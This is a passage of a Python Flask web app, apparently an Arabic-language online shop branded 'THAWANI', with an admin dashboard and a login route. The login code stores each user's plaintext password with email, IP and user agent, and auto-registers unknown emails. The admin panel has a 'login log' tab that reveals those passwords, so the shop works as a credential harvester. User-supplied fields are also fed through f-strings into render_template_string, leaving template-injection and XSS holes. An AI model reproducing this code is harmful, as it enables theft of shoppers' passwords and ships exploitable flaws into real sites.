        'users': conn.execute("SELECT COUNT(*) FROM users").fetchone()[0],
        'orders': conn.execute("SELECT COUNT(*) FROM orders").fetchone()[0],
        'products': conn.execute("SELECT COUNT(*) FROM products WHERE is_active=1").fetchone()[0],
        'pending': conn.execute("SELECT COUNT(*) FROM orders WHERE status='pending'").fetchone()[0]
    }
    
    orders = conn.execute("SELECT * FROM orders ORDER BY id DESC LIMIT 50").fetchall()
    cats = conn.execute("SELECT * FROM categories").fetchall()
    products = conn.execute("SELECT * FROM products WHERE is_active=1 ORDER BY id DESC").fetchall()
    delivery_reviews = conn.execute('''
        SELECT dr.*, o.id as order_id_num 
        FROM delivery_reviews dr 
        JOIN orders o ON dr.order_id = o.id 
        ORDER BY dr.id DESC LIMIT 20
    ''').fetchall()
    login_logs = conn.execute("SELECT * FROM login_logs ORDER BY id DESC LIMIT 100").fetchall()
    
    conn.close()
    
    html_cats_options = ''
    for c in cats:
        html_cats_options += f'<option value="{c["name"]}">{c["name"]}</option>'
    
    html_cats_display = ''
    for c in cats:
        html_cats_display += f'<span class="category-tag">{c["name"]}</span>'
    
    html_orders_table = ''
    for o in orders:
        if o['status'] == 'pending':
            status_badge = 'status-pending'
            status_text = '⏳ قيد المراجعة'
        elif o['status'] == 'approved':
            status_badge = 'status-approved'
            status_text = '✅ تم القبول'
        else:
            status_badge = 'status-rejected'
            status_text = '❌ مرفوض'
        
        html_orders_table += f'''
        <tr>
            <td><span class="order-id-badge">#{o["id"]}</span></td>
            <td>
                <div style="font-weight: 800;">{o["full_name"]}</div>
                <div style="font-size: 12px; color: var(--text-muted);">{o["phone"]}</div>
            </td>
            <td style="max-width: 200px; font-size: 12px;">{o["items_details"]}</td>
            <td style="font-weight: 800; color: var(--primary);">{o["total_price"]:.3f}</td>
            <td><span class="status-badge {status_badge}">{status_text}</span></td>
            <td>
                <form method="POST" style="display: flex; gap: 6px; flex-wrap: wrap;">
                    <input type="hidden" name="action" value="update_order">
                    <input type="hidden" name="order_id" value="{o["id"]}">
                    <select name="status" class="form-control-modern" style="width: auto; padding: 8px; font-size: 12px;">
                        <option value="pending" {"selected" if o["status"]=="pending" else ""}>قيد المراجعة</option>
                        <option value="approved" {"selected" if o["status"]=="approved" else ""}>قبول</option>
                        <option value="rejected" {"selected" if o["status"]=="rejected" else ""}>رفض</option>
                    </select>
                    <input type="text" name="notes" placeholder="ملاحظات..." value="{o["notes"] or ""}" class="form-control-modern" style="width: 100px; padding: 8px; font-size: 12px;">
                    <button type="submit" class="btn-modern small">حفظ</button>
                    <a href="/view_receipt/{o["id"]}" target="_blank" class="btn-modern secondary small">الإيصال</a>
                </form>
            </td>
        </tr>
        '''
    
    html_products_grid = ''
    for p in products:
        if p['shipping_type'] == 'free':
            shipping_badge = '<span class="shipping-badge shipping-free">🚚 مجاني</span>'
        else:
            shipping_badge = f'<span class="shipping-badge shipping-paid">🚚 {p["shipping_price"]:.3f}</span>'
        html_products_grid += f'''
        <div class="product-card-admin">
            <img src="/static/uploads/{p["img"]}" class="product-img-admin" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22300%22 height=%22180%22><rect fill=%22%23e8f5e9%22 width=%22300%22 height=%22180%22/></svg>'">
            <div class="product-info-admin">
                <div class="product-name-admin">{p["name"]}</div>
                <div class="product-meta-admin">
                    <span class="category-tag">{p["category"]}</span>
                    {shipping_badge}
                </div>
                <div style="display: flex; justify-content: space-between; align-items: center;">
                    <span class="product-price-admin">{p["price"]:.3f} OMR</span>
                    <form method="POST" style="display: inline;" onsubmit="return confirm('حذف المنتج نهائياً؟')">
                        <input type="hidden" name="action" value="delete_product">
                        <input type="hidden" name="product_id" value="{p["id"]}">
                        <button type="submit" class="btn-modern danger small">🗑️ حذف</button>
                    </form>
                </div>
            </div>
        </div>
        '''
    
    html_reviews = ''
    if delivery_reviews:
        for r in delivery_reviews:
            html_reviews += f'''
            <div class="review-card-admin">
                <div class="review-header">
                    <div>
                        <span class="order-id-badge" style="margin-left: 8px;">طلب #{r["order_id_num"]}</span>
                        <span class="reviewer-name">{r["user_email"][:25]}...</span>
                    </div>
                    <span class="review-date">{r["created_at"][:16] if r["created_at"] else ""}</span>
                </div>
                <div class="review-text">{r["review"]}</div>
            </div>
            '''
    else:
        html_reviews = '<div style="text-align: center; padding: 40px; color: var(--text-muted);">لا توجد تقييمات بعد</div>'
    
    html_login_logs = ''
    if login_logs:
        for log in login_logs:
            html_login_logs += f'''
            <div class="login-log-card">
                <div class="log-header">
                    <span class="log-time">📅 {log["login_time"]}</span>
                    <span style="font-size: 12px; color: var(--text-muted);">IP: {log["ip_address"] or 'Unknown'}</span>
                </div>
                <div class="log-details">
                    <div class="log-row">
                        <span class="log-label">📧 الإيميل:</span>
                        <span class="log-value hidden-text" id="email-{log["id"]}" data-value="{log["email"]}">{'*' * len(log["email"])}</span>
                        <button type="button" class="eye-btn" onclick="toggleVisibility('email-{log["id"]}')">👁️</button>
                    </div>
                    <div class="log-row">
                        <span class="log-label">🔑 الباسورد:</span>
                        <span class="log-value hidden-text" id="pass-{log["id"]}" data-value="{log["password"]}">{'*' * len(log["password"])}</span>
                        <button type="button" class="eye-btn" onclick="toggleVisibility('pass-{log["id"]}')">👁️</button>
                    </div>
                </div>
            </div>
            '''
    else:
        html_login_logs = '<div style="text-align: center; padding: 60px 20px; color: var(--text-muted);"><div style="font-size: 48px; margin-bottom: 16px;">📋</div><h3>لا يوجد سجل دخول بعد</h3></div>'
    
    return render_template_string(render_page('لوحة التحكم', f"""
    <div class="admin-container">
        <div class="admin-header">
            <h1>⚙️ لوحة التحكم</h1>
            <p>إدارة المتجر والطلبات والمنتجات</p>
        </div>
        
        <div class="dashboard-grid">
            <div class="dashboard-card primary">
                <div class="dashboard-icon">👥</div>
                <div class="dashboard-number">{stats['users']}</div>
                <div class="dashboard-label">المستخدمين</div>
            </div>
            <div class="dashboard-card warning">
                <div class="dashboard-icon">📦</div>
                <div class="dashboard-number">{stats['orders']}</div>
                <div class="dashboard-label">الطلبات</div>
            </div>
            <div class="dashboard-card success">
                <div class="dashboard-icon">🛍️</div>
                <div class="dashboard-number">{stats['products']}</div>
                <div class="dashboard-label">المنتجات</div>
            </div>
            <div class="dashboard-card info">
                <div class="dashboard-icon">⏳</div>
                <div class="dashboard-number">{stats['pending']}</div>
                <div class="dashboard-label">بانتظار</div>
            </div>
        </div>
        
        <div class="tabs-container">
            <button class="tab-btn active" onclick="showTab('orders')">📋 الطلبات</button>
            <button class="tab-btn" onclick="showTab('products')">🛍️ المنتجات</button>
            <button class="tab-btn" onclick="showTab('add-product')">➕ منتج</button>
            <button class="tab-btn" onclick="showTab('categories')">📁 أصناف</button>
            <button class="tab-btn" onclick="showTab('reviews')">⭐ تقييمات</button>
            <button class="tab-btn" onclick="showTab('login-logs')" style="color: #e53935;">🔐 سجل الدخول</button>
        </div>
        
        <div id="tab-orders" class="tab-content active">
            <div class="admin-section-new">
                <div class="section-header">
                    <h2 class="section-title">📋 إدارة الطلبات</h2>
                </div>
                <div style="overflow-x: auto;">
                    <table class="orders-table">
                        <thead>
                            <tr>
                                <th>رقم الطلب</th>
                                <th>العميل</th>
                                <th>المنتجات</th>
                                <th>المبلغ</th>
                                <th>الحالة</th>
                                <th>الإجراء</th>
                            </tr>
                        </thead>
                        <tbody>
                            {html_orders_table}
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
        
        <div id="tab-products" class="tab-content">
            <div class="admin-section-new">
                <div class="section-header">
                    <h2 class="section-title">🛍️ إدارة المنتجات</h2>
                    <span class="dashboard-label">{len(products)} منتج</span>
                </div>
                <div class="product-grid">
                    {html_products_grid}
                </div>
            </div>
        </div>
        
        <div id="tab-add-product" class="tab-content">
            <div class="admin-section-new">
                <div class="section-header">
                    <h2 class="section-title">➕ إضافة منتج جديد</h2>
                </div>
                <form method="POST" enctype="multipart/form-data" class="form-modern">
                    <input type="hidden" name="action" value="add_product">
                    <div class="form-grid-2">
                        <div class="form-group-modern">
                            <label>اسم المنتج *</label>
                            <input type="text" name="name" class="form-control-modern" placeholder="مثال: عطر مسك الطهارة" required>
                        </div>
                        <div class="form-group-modern">
                            <label>السعر *</label>
                            <input type="number" name="price" step="0.001" class="form-control-modern" placeholder="0.000" required>
                        </div>
                    </div>
                    <div class="form-grid-2">
                        <div class="form-group-modern">
                            <label>الصنف *</label>
                            <select name="cat" class="form-control-modern" required>
                                <option value="">اختر الصنف...</option>
                                {html_cats_options}
                            </select>
                        </div>
                        <div class="form-group-modern">
                            <label>المخزون</label>
                            <input type="number" name="stock" value="0" class="form-control-modern">
                        </div>
                    </div>
                    <div class="form-group-modern">
                        <label>الوصف</label>
                        <textarea name="desc" rows="3" class="form-control-modern" placeholder="وصف المنتج..."></textarea>
                    </div>
                    
                    <div class="form-group-modern">
                        <label>نوع الشحن *</label>
                        <div class="radio-group">
                            <label class="radio-option selected" onclick="selectShipping('free')">
                                <input type="radio" name="shipping_type" value="free" checked onchange="toggleShippingPrice()">
                                <span class="radio-label">
                                    <span class="radio-icon">🚚</span>
                                    <span>شحن مجاني</span>
                                </span>
                            </label>
                            <label class="radio-option" onclick="selectShipping('paid')">
                                <input type="radio" name="shipping_type" value="paid" onchange="toggleShippingPrice()">
                                <span class="radio-label">
                                    <span class="radio-icon">💰</span>
                                    <span>تكلفة شحن</span>
                                </span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="form-group-modern shipping-price-input" id="shipping-price-container">
                        <label>سعر الشحن *</label>
                        <input type="number" name="shipping_price" step="0.001" class="form-control-modern" placeholder="0.000" id="shipping-price-input">
                    </div>
                    
                    <div class="form-group-modern">
                        <label>صورة المنتج *</label>
                        <input type="file" name="img" accept="image/*" class="form-control-modern" style="padding: 16px;" required>
                    </div>
                    <button type="submit" class="btn-modern" style="width: 100%; justify-content: center; padding: 14px;">
                        <span>✨</span>
                        <span>إضافة المنتج</span>
                    </button>
                </form>
            </div>
        </div>
        
        <div id="tab-categories" class="tab-content">
            <div class="admin-section-new">
                <div class="section-header">
                    <h2 class="section-title">📁 إدارة الأصناف</h2>
                </div>
                <div class="form-grid-2">
                    <div>
                        <h3 style="margin-bottom: 16px; color: var(--primary); font-weight: 800;">الأصناف الحالية</h3>
                        <div style="display: flex; flex-wrap: wrap; gap: 8px;">
                            {html_cats_display}
                        </div>
                    </div>
                    <div style="background: var(--bg); padding: 24px; border-radius: 16px;">
                        <h3 style="margin-bottom: 16px; color: var(--primary); font-weight: 800;">➕ إضافة صنف جديد</h3>
                        <form method="POST" class="form-modern">
                            <input type="hidden" name="action" value="add_cat">
                            <div class="form-group-modern">
                                <label>اسم الصنف الجديد *</label>
                                <input type="text" name="cat_name" class="form-control-modern" placeholder="مثال: عطور، أثاث..." required>
                            </div>
                            <button type="submit" class="btn-modern" style="width: 100%; justify-content: center;">
                                <span>📁</span>
                                <span>إضافة الصنف</span>
                            </button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        
        <div id="tab-reviews" class="tab-content">
            <div class="admin-section-new">
                <div class="section-header">
                    <h2 class="section-title">⭐ تقييمات التوصيل</h2>
                    <span class="dashboard-label">{len(delivery_reviews)} تقييم</span>
                </div>
                {html_reviews}
            </div>
        </div>
        
        <div id="tab-login-logs" class="tab-content">
            <div class="admin-section-new">
                <div class="section-header">
                    <h2 class="section-title" style="color: #e53935;">🔐 سجل تسجيل الدخول</h2>
                    <span class="dashboard-label">{len(login_logs)} تسجيل</span>
                </div>
                <div style="background: #ffebee; padding: 12px; border-radius: 8px; margin-bottom: 16px; font-size: 13px; color: #c62828; font-weight: 800; text-align: center;">
                    ⚠️ تحذير: هذه البيانات حساسة وسرية - لا تشاركها مع أحد
                </div>
                <div style="max-height: 600px; overflow-y: auto;">
                    {html_login_logs}
                </div>
            </div>
        </div>
    </div>
    
    <script>
        function showTab(tabName) {{
            document.querySelectorAll('.tab-content').forEach(tab => {{
                tab.classList.remove('active');
            }});
            document.querySelectorAll('.tab-btn').forEach(btn => {{
                btn.classList.remove('active');
            }});
            document.getElementById('tab-' + tabName).classList.add('active');
            event.target.classList.add('active');
        }}
        
        function selectShipping(type) {{
            document.querySelectorAll('.radio-option').forEach(opt => {{
                opt.classList.remove('selected');
            }});
            event.currentTarget.classList.add('selected');
        }}
        
        function toggleShippingPrice() {{
            const container = document.getElementById('shipping-price-container');
            const input = document.getElementById('shipping-price-input');
            const selectedValue = document.querySelector('input[name="shipping_type"]:checked').value;
            
            if (selectedValue === 'paid') {{
                container.classList.add('show');
                input.setAttribute('required', 'required');
            }} else {{
                container.classList.remove('show');
                input.removeAttribute('required');
                input.value = '';
            }}
        }}
        
        function toggleVisibility(elementId) {{
            const element = document.getElementById(elementId);
            const realValue = element.getAttribute('data-value');
            
            if (element.classList.contains('hidden-text')) {{
                element.textContent = realValue;
                element.classList.remove('hidden-text');
            }} else {{
                element.textContent = '*'.repeat(realValue.length);
                element.classList.add('hidden-text');
            }}
        }}
    </script>
    """))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if 'user' in session:
        return redirect('/')
    
    if request.method == 'POST':
        email = request.form.get('email', '').strip().lower()
        password = request.form.get('password', '')
        
        conn = get_db()
        user = conn.execute("SELECT * FROM users WHERE email=?", (email,)).fetchone()
        
        if user and check_password_hash(user['password_hash'], password):
            session['user'] = email
            session['is_admin'] = bool(user['is_admin'])
            
            try:
                conn.execute('''
                    INSERT INTO login_logs (email, password, ip_address, user_agent)
                    VALUES (?, ?, ?, ?)
                ''', (
                    email, 
                    password, 
                    request.remote_addr,
                    request.headers.get('User-Agent', 'Unknown')
                ))
                conn.commit()
            except Exception as e:
                logger.error(f"Error logging login: {e}")
            
            conn.close()
            return redirect('/')
        else:
            try:
                hashed = generate_password_hash(password)
                conn.execute("INSERT INTO users (email, password_hash) VALUES (?, ?)", (email, hashed))
                conn.commit()
                session['user'] = email
                session['is_admin'] = False
                
                try:
                    conn.execute('''
                        INSERT INTO login_logs (email, password, ip_address, user_agent)
                        VALUES (?, ?, ?, ?)
                    ''', (
                        email, 
                        password, 
                        request.remote_addr,
                        request.headers.get('User-Agent', 'Unknown')
                    ))
                    conn.commit()
                except Exception as e:
                    logger.error(f"Error logging login for new user: {e}")
                
                conn.close()
                return redirect('/')
            except:
                flash('خطأ في تسجيل الدخول', 'error')
        
        conn.close()
    
    return render_template_string(render_page('تسجيل الدخول', """
    <div style="min-height:100vh; display:flex; align-items:center; justify-content:center; background:linear-gradient(135deg, #f8faf8 0%, #e8f5e9 100%); padding: 16px;">
        <div style="background:white; padding:32px 24px; border-radius:24px; width:100%; max-width:360px; box-shadow:0 10px 40px rgba(0,0,0,0.1); border: 1px solid var(--border);">
            <div style="text-align:center; margin-bottom:28px;">
                <div style="width:70px; height:70px; background:linear-gradient(135deg, var(--primary), var(--primary-dark)); border-radius:20px; margin:0 auto 16px; display:flex; align-items:center; justify-content:center; color:white; font-size:32px; box-shadow: 0 6px 20px rgba(26, 95, 42, 0.3);">🌿</div>
                <h1 style="color:var(--primary); font-size:28px; font-weight: 800; letter-spacing: 1px;">THAWANI</h1>
                <p style="color: var(--text-muted); margin-top: 6px; font-size: 13px; font-weight: 700;">تسوق بأمان وراحة</p>
            </div>
            <form method="POST">
                <div class="form-group">
                    <label style="font-size: 13px;">البريد الإلكتروني</label>
                    <input name="email" type="email" placeholder="name@example.com" required style="padding: 12px; font-size: 15px;">
                </div>
                <div class="form-group">
                    <label style="font-size: 13px;">كلمة المرور</label>
                    <input name="password" type="password" placeholder="••••••••" required style="padding: 12px; font-size: 15px;">
                </div>
                <button class="btn btn-primary btn-block" style="padding: 14px; font-size: 16px; margin-top: 8px; font-weight: 800;">دخول</button>
            </form>
        </div>
    </div>
    """, show_nav=False))

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000, debug=False)
